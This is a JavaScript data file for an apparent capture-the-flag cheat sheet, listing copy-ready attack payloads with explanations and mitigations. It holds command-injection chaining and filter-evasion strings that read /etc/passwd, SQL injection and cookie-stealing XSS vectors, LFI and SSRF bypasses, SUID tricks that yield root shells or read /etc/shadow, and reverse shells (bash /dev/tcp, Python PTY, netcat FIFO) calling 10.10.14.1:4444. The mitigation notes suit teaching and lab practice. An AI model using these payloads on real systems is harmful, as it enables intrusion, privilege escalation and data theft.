/* CTF Atlas — Master Tricks, Payloads & Command Injection Vault v1.0 */
/* Comprehensive cheat sheet for command chaining, evasion, SUID GTFOBins, and web payloads */
'use strict';

window.CTF_TRICKS_DATA = [
  /* ── CATEGORY 01: COMMAND CHAINING & CONTROL FLOW OPERATORS ── */
  {
    id: "chain-semicolon",
    category: "chaining",
    categoryLabel: "Command Chaining",
    title: "Sequential Command Separation (;)",
    payload: "; ls -la",
    context: "When input parameter is interpolated into a system shell call without quotes: `system('ping ' + ip)`.",
    why: "The POSIX shell grammar treats the semicolon (`;`) as a command terminator identical to a newline, ending the first command and executing the second unconditionally.",
    internals: "Shell parser splits the input line into AST command nodes delimited by ';'. Each node is executed sequentially regardless of previous return codes.",
    mitigation: "Use parameterized execution functions (`subprocess.run(['ping', ip], shell=False)`) or reject inputs containing shell metacharacters.",
    copyText: "; ls -la"
  },
  {
    id: "chain-and",
    category: "chaining",
    categoryLabel: "Command Chaining",
    title: "Conditional Success Chaining (&&)",
    payload: "&& cat /etc/passwd",
    context: "When preceding command must succeed with return code 0 before executing payload.",
    why: "The `&&` token represents the logical AND control operator. It executes the right-hand command only if the left-hand command returns exit status 0 (success).",
    internals: "The shell executes command 1, reads its return code via `waitpid()`. If `$? == 0`, it executes command 2.",
    mitigation: "Never pass user input to `/bin/sh -c` or `eval`. Enforce strict whitelisting.",
    copyText: "&& cat /etc/passwd"
  },
  {
    id: "chain-or",
    category: "chaining",
    categoryLabel: "Command Chaining",
    title: "Conditional Fallback Chaining (||)",
    payload: "invalid_param || id",
    context: "When preceding command is designed to intentionally fail, triggering immediate fallback execution.",
    why: "The `||` operator executes the right-hand command only if the left-hand command terminates with a non-zero exit status (failure).",
    internals: "The shell checks exit status `$?`. If non-zero, control flow branches to execute the fallback command.",
    mitigation: "Avoid string concatenation in shell commands. Validate arguments using strict alphanumeric regexes.",
    copyText: "invalid_param || id"
  },
  {
    id: "chain-pipe",
    category: "chaining",
    categoryLabel: "Command Chaining",
    title: "Standard Output Piping (|)",
    payload: "| id",
    context: "When chaining command output or injecting into downstream consumers.",
    why: "The pipe operator (`|`) connects the standard output (`stdout`) of the preceding process directly to the standard input (`stdin`) of the next process via a kernel pipe buffer.",
    internals: "Invokes `pipe(pipefd)` followed by `dup2()` system calls, binding `STDOUT_FILENO` of process 1 to `STDIN_FILENO` of process 2.",
    mitigation: "Isolate parameters by invoking binaries with explicit argument vectors rather than shell interpreters.",
    copyText: "| id"
  },
  {
    id: "chain-background",
    category: "chaining",
    categoryLabel: "Command Chaining",
    title: "Asynchronous Background Execution (&)",
    payload: "& nc -e /bin/sh 10.10.14.1 4444 &",
    context: "When long-running commands (e.g. reverse shells) would otherwise trigger HTTP connection timeouts.",
    why: "Placing `&` after a command tells the shell to fork the job into the background asynchronously and return prompt control immediately.",
    internals: "The shell forks a child process without waiting for `SIGCHLD`, immediately resolving the initial request.",
    mitigation: "Disable shell invocation in application backends; use asynchronous background task queues (Celery, BullMQ).",
    copyText: "& nc -e /bin/sh 10.10.14.1 4444 &"
  },
  {
    id: "chain-subshell-dollar",
    category: "chaining",
    categoryLabel: "Command Chaining",
    title: "Subshell Command Substitution ($(cmd))",
    payload: "$(whoami)",
    context: "When injecting inside double-quoted strings (`\"ping \" + ip + \"\"`) or inside other command arguments.",
    why: "In Bash and POSIX sh, `$(cmd)` executes `cmd` in a subshell environment and replaces the token with its standard output before the outer command runs.",
    internals: "Kernel forks a subshell, executes the inner command, captures stdout, trims trailing newlines, and substitutes into the parent's argv list.",
    mitigation: "Treat inputs as data literals rather than executable shell strings.",
    copyText: "$(whoami)"
  },
  {
    id: "chain-subshell-backtick",
    category: "chaining",
    categoryLabel: "Command Chaining",
    title: "Legacy Backtick Command Substitution (`cmd`)",
    payload: "`id`",
    context: "When WAF or filter specifically blocks the `$` dollar sign character.",
    why: "Backticks represent legacy command substitution in Unix shells, executing the enclosed string identically to `$(cmd)`.",
    internals: "The shell scanner identifies backtick pairs, evaluates the enclosed string in a child process, and splices stdout into the command line.",
    mitigation: "Filter backticks or use execution APIs that bypass the shell.",
    copyText: "`id`"
  },
  {
    id: "chain-newline",
    category: "chaining",
    categoryLabel: "Command Chaining",
    title: "Newline Statement Separator (%0a / \\n)",
    payload: "%0aid%0awhoami",
    context: "When semicolons (`;`) and pipes (`|`) are strictly filtered by regex input sanitizers.",
    why: "The POSIX shell specification defines a newline (`\\n`, URL-encoded as `%0a`) as a first-class command separator token identical in function to a semicolon.",
    internals: "The lexer treats `\\n` as the termination of a command statement, resetting parser state to accept a new command.",
    mitigation: "Sanitize CRLF characters (`\\r`, `\\n`, `%0d`, `%0a`) from all command inputs.",
    copyText: "%0aid%0awhoami"
  },

  /* ── CATEGORY 02: WHITESPACE & DELIMITER FILTERING EVASION ── */
  {
    id: "white-ifs",
    category: "whitespace",
    categoryLabel: "Whitespace Evasion",
    title: "Internal Field Separator ($IFS / $IFS$9)",
    payload: "cat$IFS$9/etc/passwd",
    context: "When spaces are filtered, rejected, or stripped by web forms or naive regexes (`/\\s+/`).",
    why: "The shell uses the `$IFS` environment variable to define word boundaries (defaults to space, tab, newline). Adding `$9` (which evaluates to an empty string for unused positional parameters) acts as a clean separator without whitespace.",
    internals: "Bash performs parameter expansion followed by word splitting based on characters present in the `$IFS` variable.",
    mitigation: "Do not rely on space-filtering as a security control; parameterize commands directly.",
    copyText: "cat$IFS$9/etc/passwd"
  },
  {
    id: "white-brace",
    category: "whitespace",
    categoryLabel: "Whitespace Evasion",
    title: "Brace Expansion ({cmd,arg1,arg2})",
    payload: "{cat,/etc/passwd}",
    context: "When spaces are filtered and environment variable expansion (`$IFS`) is disabled or restricted.",
    why: "Bash brace expansion generates comma-separated values into distinct argv elements without requiring literal space characters.",
    internals: "The shell expands `{a,b}` into two tokens `a` and `b` during pre-execution syntax expansion.",
    mitigation: "Enforce strict allowlists on character sets (e.g. only alphanumeric values allowed).",
    copyText: "{cat,/etc/passwd}"
  },
  {
    id: "white-redirection",
    category: "whitespace",
    categoryLabel: "Whitespace Evasion",
    title: "Input Redirection Without Space (<)",
    payload: "cat</etc/passwd",
    context: "When space characters are filtered and target command accepts input via standard input.",
    why: "In shell syntax, the redirection operator `<` does not require whitespace between the command, the operator, and the filename.",
    internals: "The shell opens `/etc/passwd` with `O_RDONLY` and redirects `STDIN_FILENO` (fd 0) to it before invoking `execve(/bin/cat)`.",
    mitigation: "Sanitize redirection characters (`<`, `>`, `>>`, `|`).",
    copyText: "cat</etc/passwd"
  },
  {
    id: "white-ansi-c",
    category: "whitespace",
    categoryLabel: "Whitespace Evasion",
    title: "ANSI-C Quoting Space Literal ($'\\x20')",
    payload: "cat$'\\x20'/etc/passwd",
    context: "When spaces are stripped but dollar sign and single quotes are permitted.",
    why: "Bash ANSI-C quoting syntax (`$'...'`) expands escape sequences like `\\x20` (ASCII hex for space) or `\\t` (tab) into raw characters before executing the line.",
    internals: "Bash parses the escape sequence in word expansion, producing a literal space character byte in the resulting argument string.",
    mitigation: "Filter dollar signs and quotes; validate input against strict character sets.",
    copyText: "cat$'\\x20'/etc/passwd"
  },
  {
    id: "white-tabs",
    category: "whitespace",
    categoryLabel: "Whitespace Evasion",
    title: "Horizontal Tab Separation (%09 / \\t)",
    payload: "cat%09/etc/passwd",
    context: "When spaces (`0x20`) are stripped but tab characters (`0x09`) are ignored by naive filters.",
    why: "The POSIX shell treats horizontal tab characters as standard whitespace delimiters for word splitting identically to spaces.",
    internals: "Word splitting parses `\\t` as part of `$IFS` defaults.",
    mitigation: "Strip all whitespace characters (`[\\s\\t\\r\\n]`) during input validation.",
    copyText: "cat\t/etc/passwd"
  },

  /* ── CATEGORY 03: KEYWORD & STRING FILTERING EVASION ── */
  {
    id: "obf-quote-splicing",
    category: "obfuscation",
    categoryLabel: "Keyword Obfuscation",
    title: "Quote Splicing ('c'a't' / \"c\"\"a\"\"t\")",
    payload: "c'a't /e't'c/p'a's's'w'd",
    context: "When target system has a blacklist filtering specific command names like 'cat' or 'passwd'.",
    why: "Adjacent string literals in shell syntax are concatenated into a single string token without quotes. The shell executes `/bin/cat /etc/passwd` normally.",
    internals: "The tokenizer strips quote characters and aggregates continuous character runs into single argv elements.",
    mitigation: "Never use blacklists of blocked commands; enforce strict positive validation.",
    copyText: "c'a't /e't'c/p'a's's'w'd"
  },
  {
    id: "obf-backslash",
    category: "obfuscation",
    categoryLabel: "Keyword Obfuscation",
    title: "Backslash Character Escaping (c\\at)",
    payload: "c\\at /e\\tc/p\\as\\sw\\d",
    context: "When a WAF checks for exact keyword matches but permits backslashes.",
    why: "A backslash before a standard non-special character evaluates to the literal character itself while defeating static string pattern matching.",
    internals: "The shell escape parser evaluates `\\a` as `a`.",
    mitigation: "Normalize inputs before matching or invoke commands via strict argument arrays.",
    copyText: "c\\at /e\\tc/p\\as\\sw\\d"
  },
  {
    id: "obf-wildcards",
    category: "obfuscation",
    categoryLabel: "Keyword Obfuscation",
    title: "Wildcard Glob Pattern Matching (/???/??t)",
    payload: "/???/??t /???/p*d",
    context: "When all alphabetic letters of command names or filenames are blocked.",
    why: "The shell expands glob patterns (`?` for single character, `*` for arbitrary characters). `/???/??t` matches `/bin/cat` and `/???/p*d` matches `/etc/passwd`.",
    internals: "Filename expansion queries filesystem directory dentries matching the pattern length and structure.",
    mitigation: "Sanitize wildcard characters (`*`, `?`, `[`, `]`).",
    copyText: "/???/??t /???/p*d"
  },
  {
    id: "obf-unset-vars",
    category: "obfuscation",
    categoryLabel: "Keyword Obfuscation",
    title: "Unset Variable Splicing (c$u\"\"at)",
    payload: "c$u\"\"at /etc/passwd",
    context: "When static signature scanners check for known command names.",
    why: "Unset environment variables in Bash evaluate to an empty string. `c$u\"\"at` expands to `cat` at execution time.",
    internals: "Parameter expansion substitutes `$u` with empty string before command execution.",
    mitigation: "Block dollar signs or execute commands without a shell wrapper.",
    copyText: "c$u\"\"at /etc/passwd"
  },
  {
    id: "obf-base64-pipe",
    category: "obfuscation",
    categoryLabel: "Keyword Obfuscation",
    title: "Base64 Decoded Stream Execution",
    payload: "echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh",
    context: "When complex commands with special characters, quotes, and slashes must be executed cleanly.",
    why: "Base64 encodes all metacharacters into an alphanumeric stream (`A-Za-z0-9+/=`). Piping into `sh` executes the decoded command in-memory.",
    internals: "Base64 decodes the payload into stdout; `/bin/sh` reads commands line-by-line from stdin.",
    mitigation: "Inspect child process arguments and block piped execution to shell binaries.",
    copyText: "echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh"
  },
  {
    id: "obf-hex-printf",
    category: "obfuscation",
    categoryLabel: "Keyword Obfuscation",
    title: "Hexadecimal Printf Evaluation",
    payload: "$(printf '\\x2f\\x62\\x69\\x6e\\x2f\\x63\\x61\\x74') /etc/passwd",
    context: "When alphanumeric characters of the command binary name are blocked by regex.",
    why: "`printf` interprets hex escapes (`\\x2f` -> `/`, `\\x62` -> `b`, etc.), reconstructing the string `/bin/cat` dynamically.",
    internals: "Subshell substitution executes printf, capturing its unescaped byte output as the command name.",
    mitigation: "Restrict shell execution environments and sanitize escape sequences.",
    copyText: "$(printf '\\x2f\\x62\\x69\\x6e\\x2f\\x63\\x61\\x74') /etc/passwd"
  },
  {
    id: "obf-rev-pipe",
    category: "obfuscation",
    categoryLabel: "Keyword Obfuscation",
    title: "String Reversal via `rev`",
    payload: "$(rev <<< 'dwssap/cte/ tac')",
    context: "When commands are scanned by forward pattern-matching inspection engines.",
    why: "The `rev` utility reverses strings character-by-character. `rev <<< 'dwssap/cte/ tac'` produces `cat /etc/passwd`.",
    internals: "Here-string (`<<<`) passes reversed string to `rev`, which outputs the forward command into subshell substitution.",
    mitigation: "Disable shell access and inspect command line arguments via auditd / eBPF.",
    copyText: "$(rev <<< 'dwssap/cte/ tac')"
  },

  /* ── CATEGORY 04: WEB INJECTION & BYPASS TRICKS ── */
  {
    id: "web-sqli-comment-dash",
    category: "web",
    categoryLabel: "Web & Injection",
    title: "SQLi Comment Truncation (-- - / #)",
    payload: "' OR 1=1-- -",
    context: "When closing quotes or authentication conditions must be neutralized in SQL injection.",
    why: "In SQL standards, `--` followed by a space indicates a single-line comment, discarding all subsequent query characters.",
    internals: "The SQL lexer halts statement parsing for the current line upon encountering the comment token.",
    mitigation: "Use parameterized queries (prepared statements) without string interpolation.",
    copyText: "' OR 1=1-- -"
  },
  {
    id: "web-sqli-inline-comments",
    category: "web",
    categoryLabel: "Web & Injection",
    title: "SQLi Inline Comment Keyword Splitting (/**/)",
    payload: "1' UNION/**/SELECT/**/1,database(),3-- -",
    context: "When WAF or filter removes spaces or inspects whole words like 'UNION SELECT'.",
    why: "SQL engines treat `/**/` as comments, functioning as valid whitespace separators between SQL keywords.",
    internals: "MySQL and PostgreSQL parsers treat inline comment blocks as whitespace delimiters during tokenization.",
    mitigation: "Deploy Web Application Firewalls with AST-level parsing; use prepared statements.",
    copyText: "1' UNION/**/SELECT/**/1,database(),3-- -"
  },
  {
    id: "web-sqli-hex-literal",
    category: "web",
    categoryLabel: "Web & Injection",
    title: "SQLi String Hex Literals (0x61646d696e)",
    payload: "' UNION SELECT 1,0x61646d696e,3-- -",
    context: "When single quotes (`'`) are escaped or stripped by `addslashes` or input sanitizers.",
    why: "SQL databases allow string literals to be represented as hexadecimal numbers (`0x61646d696e` is `'admin'`), eliminating the need for quotes.",
    internals: "The SQL tokenizer converts the hex numeric literal into a string byte buffer directly.",
    mitigation: "Enforce strict data typing and use prepared statements.",
    copyText: "' UNION SELECT 1,0x61646d696e,3-- -"
  },
  {
    id: "web-xss-svg-onload",
    category: "web",
    categoryLabel: "Web & Injection",
    title: "XSS Self-Executing Vector (<svg/onload=...>)",
    payload: "<svg/onload=alert(document.cookie)>",
    context: "When `<script>` tags and spaces are filtered by naive XSS blacklists.",
    why: "SVG elements execute their `onload` event handler immediately upon DOM insertion without user interaction, and `/` functions as an attribute separator.",
    internals: "The browser HTML parser instantiates the SVG DOM element and fires the inline event handler during initial layout.",
    mitigation: "Use context-aware HTML entity encoding (DOMPurify, OWASP Java Encoder) and strict Content Security Policy (`script-src 'self'`).",
    copyText: "<svg/onload=alert(document.cookie)>"
  },
  {
    id: "web-xss-atob-eval",
    category: "web",
    categoryLabel: "Web & Injection",
    title: "XSS Base64 Payload Execution (eval(atob(...)))",
    payload: "<img src=x onerror=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>",
    context: "When quotes, parentheses, or specific JavaScript keywords are filtered.",
    why: "Base64 encodes the entire exploit script. `atob()` decodes the string in the browser, and `eval()` executes it dynamically.",
    internals: "JavaScript engine evaluates the decoded string as code within the active execution context.",
    mitigation: "Disallow `unsafe-eval` in CSP directives (`script-src 'self'`); encode all untrusted output.",
    copyText: "<img src=x onerror=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>"
  },
  {
    id: "web-lfi-php-wrapper",
    category: "web",
    categoryLabel: "Web & Injection",
    title: "PHP Filter Base64 Wrapper (php://filter)",
    payload: "php://filter/convert.base64-encode/resource=index.php",
    context: "When target has Local File Inclusion (LFI) and executing the file would otherwise hide the source code.",
    why: "The `php://filter` stream wrapper reads files and encodes them to Base64 before PHP's execution engine parses them, returning clear source code.",
    internals: "PHP stream filter architecture intercepts the read stream, applies the conversion filter, and transmits base64 data to the application.",
    mitigation: "Whitelist permitted filenames; do not pass user input directly to `include()`, `require()`, or `file_get_contents()`.",
    copyText: "php://filter/convert.base64-encode/resource=index.php"
  },
  {
    id: "web-ssrf-decimal-ip",
    category: "web",
    categoryLabel: "Web & Injection",
    title: "SSRF Decimal IP Address Encoding (2130706433)",
    payload: "http://2130706433/",
    context: "When SSRF filters block literal string '127.0.0.1' or 'localhost'.",
    why: "IPv4 addresses are 32-bit integers. `127.0.0.1` equals `(127 * 2^24) + (0 * 2^16) + (0 * 2^8) + 1 = 2130706433`. Sockets resolve decimal IPs normally.",
    internals: "Operating system `inet_aton()` converts integer representations into binary IPv4 addresses directly.",
    mitigation: "Resolve hostnames, convert to standardized canonical IPv4/IPv6 notation, and verify against private IP ranges (`127.0.0.0/8`, `10.0.0.0/8`, `169.254.0.0/16`).",
    copyText: "http://2130706433/"
  },

  /* ── CATEGORY 05: PRIVILEGE ESCALATION & SUID ABUSES ── */
  {
    id: "priv-find-exec",
    category: "privesc",
    categoryLabel: "Privilege Escalation",
    title: "SUID find Execution (-exec /bin/sh -p)",
    payload: "find . -exec /bin/sh -p \\; -quit",
    context: "When `/usr/bin/find` has the SUID bit set (`-rwsr-xr-x 1 root root`).",
    why: "The `-exec` flag instructs `find` to execute an external binary. The `-p` flag preserves the effective root UID without dropping privileges.",
    internals: "Find executes child process with `euid = 0`. Without `-p`, shells like `bash` reset euid to ruid upon startup.",
    mitigation: "Remove SUID bit: `chmod u-s /usr/bin/find`. Never assign SUID to general utility binaries.",
    copyText: "find . -exec /bin/sh -p \\; -quit"
  },
  {
    id: "priv-vim-shell",
    category: "privesc",
    categoryLabel: "Privilege Escalation",
    title: "SUID / Sudo vim Shell Escape (:!sh)",
    payload: "vim -c ':!sh -p'",
    context: "When `vim` has SUID permissions or is allowed in `sudoers` without password.",
    why: "Vim allows executing shell commands via `:!`. Running `/bin/sh -p` spawns a root shell.",
    internals: "Vim forks `/bin/sh` retaining the elevated privileges granted to the editor.",
    mitigation: "Add `NOEXEC` tag in `/etc/sudoers` or restrict editor permissions.",
    copyText: "vim -c ':!sh -p'"
  },
  {
    id: "priv-awk-system",
    category: "privesc",
    categoryLabel: "Privilege Escalation",
    title: "SUID awk System Function Execution",
    payload: "awk 'BEGIN {system(\"/bin/sh -p\")}'",
    context: "When `awk` or `gawk` binary has SUID root.",
    why: "The `system()` function in awk directly invokes `/bin/sh`, inheriting the SUID privileges of the parent process.",
    internals: "Awk calls the libc `system()` function during script evaluation.",
    mitigation: "Remove SUID permissions from pattern scanning languages.",
    copyText: "awk 'BEGIN {system(\"/bin/sh -p\")}'"
  },
  {
    id: "priv-python-execl",
    category: "privesc",
    categoryLabel: "Privilege Escalation",
    title: "SUID python3 Process Image Replacement",
    payload: "python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
    context: "When `python3` has SUID root or is accessible via sudo.",
    why: "`os.execl()` replaces the current Python process with `/bin/sh`, preserving the elevated effective UID.",
    internals: "Invokes `execve(\"/bin/sh\", [\"sh\", \"-p\"], environ)` system call directly.",
    mitigation: "Never set SUID on interpreters (Python, Perl, Ruby, Node).",
    copyText: "python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
  },
  {
    id: "priv-tar-checkpoint",
    category: "privesc",
    categoryLabel: "Privilege Escalation",
    title: "tar Wildcard Checkpoint Privilege Escalation",
    payload: "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
    context: "When a root cron job runs `tar *` inside a directory writable by non-privileged users.",
    why: "Tar parses arguments beginning with `--` as options. If filenames named `--checkpoint=1` and `--checkpoint-action=exec=shell.sh` exist, tar executes them as root.",
    internals: "Wildcard `*` expansion puts filenames into command line arguments, causing option injection.",
    mitigation: "Never use wildcards in root scripts (`tar *`). Specify paths explicitly (`tar -- ./`).",
    copyText: "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
  },
  {
    id: "priv-base64-read",
    category: "privesc",
    categoryLabel: "Privilege Escalation",
    title: "SUID base64 Privileged File Read",
    payload: "base64 /etc/shadow | base64 -d",
    context: "When `base64` binary has SUID root permissions.",
    why: "While not a shell spawn, SUID base64 allows reading arbitrary sensitive system files like `/etc/shadow` or root SSH keys.",
    internals: "Base64 opens the file using root effective UID, encoding contents to stdout.",
    mitigation: "Strip SUID bits from all file processing utilities: `chmod -s /usr/bin/base64`.",
    copyText: "base64 /etc/shadow | base64 -d"
  },

  /* ── CATEGORY 06: AUTHORIZED LAB REVERSE & BIND SHELLS ── */
  {
    id: "shell-bash-tcp",
    category: "shells",
    categoryLabel: "Network & Shells",
    title: "Bash Interactive TCP Reverse Shell (/dev/tcp)",
    payload: "bash -i >& /dev/tcp/10.10.14.1/4444 0>&1",
    context: "Authorized CTF laboratory target running Linux with Bash available.",
    why: "Bash features an internal virtual socket device `/dev/tcp/host/port`. Redirecting stdout, stderr, and stdin to this socket provides an interactive shell without needing Netcat.",
    internals: "Bash socket handler opens a TCP stream using `socket()` and `connect()`, binding file descriptors 0, 1, and 2.",
    mitigation: "Compile Bash with `--disable-net-redirections` or restrict egress traffic at perimeter firewalls.",
    copyText: "bash -i >& /dev/tcp/10.10.14.1/4444 0>&1"
  },
  {
    id: "shell-python-pty",
    category: "shells",
    categoryLabel: "Network & Shells",
    title: "Python PTY Interactive Reverse Shell",
    payload: "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"10.10.14.1\",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'",
    context: "When target system lacks Netcat or Bash TCP, but Python 3 is installed.",
    why: "Creates a raw TCP client socket, duplicates file descriptors, and spawns a real PTY (`pty.spawn`), providing a clean terminal session.",
    internals: "Uses `dup2` to bind socket fd to standard descriptors, followed by `forkpty()` system call.",
    mitigation: "Implement strict outbound firewall egress rules allowing only required application ports.",
    copyText: "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"10.10.14.1\",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'"
  },
  {
    id: "shell-nc-fifo",
    category: "shells",
    categoryLabel: "Network & Shells",
    title: "Netcat Named Pipe Reverse Shell (FIFO)",
    payload: "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.1 4444 > /tmp/f",
    context: "When target has OpenBSD Netcat without the `-e` executable execution flag.",
    why: "Creates a named pipe (FIFO) file in `/tmp/f`. Commands read from the network socket are fed into `/bin/sh`, and its output loops back into Netcat.",
    internals: "Named pipe acts as an in-kernel bidirectional buffer connecting asynchronous process streams.",
    mitigation: "Block outbound connections; mount `/tmp` with `noexec` and monitor pipe creation.",
    copyText: "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.1 4444 > /tmp/f"
  },
  {
    id: "shell-socat-tty",
    category: "shells",
    categoryLabel: "Network & Shells",
    title: "Socat Fully Upgraded TTY Reverse Shell",
    payload: "socat file:`tty`,raw,echo=0 tcp-listen:4444",
    context: "Listener command on attacker host for catching fully interactive TTY shells (supporting tab completion and Ctrl+C).",
    why: "Socat sets up a raw terminal environment without line buffering or echo, mirroring a native SSH interactive experience.",
    internals: "Puts host terminal in raw mode via `tcsetattr()`, transmitting raw scancodes and escape sequences.",
    mitigation: "Enforce network segmentation preventing untrusted machines from establishing inbound TCP sessions.",
    copyText: "socat file:`tty`,raw,echo=0 tcp-listen:4444"
  }
];
